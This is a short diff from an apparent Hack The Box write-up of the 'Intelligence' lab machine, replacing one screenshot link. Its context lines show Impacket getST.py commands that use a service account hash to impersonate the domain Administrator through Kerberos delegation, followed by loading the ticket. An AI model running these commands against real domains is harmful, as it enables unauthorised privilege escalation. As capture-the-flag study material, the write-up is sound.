@@ -159,7 +159,7 @@ sudo apt install ntpdate
 sudo ntpdate -s 10.10.10.248
 ./getST.py -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int -hashes :51e4932f13712047027300f869d07ab6
 ```
-![image](https://github.com/regarmulia/HTB/assets/33616880/508ab84c-0a82-4734-94cf-55a4fd860095)
+![image](https://github.com/regarmulia/HTB/assets/33616880/2698b7c7-c6d8-4253-9ae3-e745af4cfc9a)
 
 ```
 export KRB5CCNAME=Administrator.ccache
